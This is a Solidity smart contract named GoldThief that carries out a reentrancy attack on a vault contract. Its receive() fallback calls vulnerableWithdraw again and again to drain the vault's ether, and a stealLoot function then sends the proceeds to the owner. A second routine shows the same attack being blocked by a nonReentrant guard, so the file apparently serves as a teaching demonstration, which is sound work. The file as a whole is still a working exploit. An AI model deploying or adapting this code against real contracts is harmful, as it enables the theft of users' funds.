// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IVault {
    function deposit() external payable;
    function vulnerableWithdraw() external;
    function safeWithdraw() external;
}

contract GoldThief {
    IVault public targetVault;
    address public owner;
    uint public attackCount;
    bool public isAttackingSafe;

    // Ensure only the owner can perform certain actions
    modifier onlyOwner() {
        require(msg.sender == owner, "GoldThief: Only owner can call this function");
        _;
    }

    // Ensure the contract has at least 1 ether before attacking
    modifier requiresMinimumETH() {
        require(msg.value >= 1 ether, "GoldThief: Need at least 1 ETH to attack");
        _;
    }

    constructor(address _vaultAddress) {
        require(_vaultAddress != address(0), "GoldThief: Invalid vault address");
        targetVault = IVault(_vaultAddress);
        owner = msg.sender;
    }

    /// @notice Starts the attack on the vulnerable withdraw function
    function attackVulnerable() external payable onlyOwner requiresMinimumETH {
        isAttackingSafe = false;
        attackCount = 0;

        // Deposit into the vault before attempting to withdraw
        targetVault.deposit{value: msg.value}();

        // Trigger the vulnerable withdraw function which will allow reentrancy
        targetVault.vulnerableWithdraw();
    }

    /// @notice Starts the attack on the safe withdraw function
    function attackSafe() external payable onlyOwner requiresMinimumETH {
        isAttackingSafe = true;
        attackCount = 0;

        // Deposit into the vault before attempting to withdraw
        targetVault.deposit{value: msg.value}();

        // Trigger the safe withdraw function (this should fail due to nonReentrant guard)
        targetVault.safeWithdraw();
    }

    /// @notice Fallback function to handle reentrancy attacks
    receive() external payable {
        attackCount++;

        // If attacking vulnerable withdraw, continue calling it until balance is drained or limit is reached
        if (!isAttackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
            targetVault.vulnerableWithdraw();
        }

        // If attacking the safe withdraw, this will fail due to the nonReentrant modifier
        if (isAttackingSafe) {
            targetVault.safeWithdraw();  // This will fail because the safeWithdraw is protected against reentrancy
        }
    }

    /// @notice Allows the owner to withdraw all funds from the contract (stolen loot)
    function stealLoot() external onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "GoldThief: No loot to steal");

        payable(owner).transfer(balance);
    }

    /// @notice View function to check the contract's balance
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
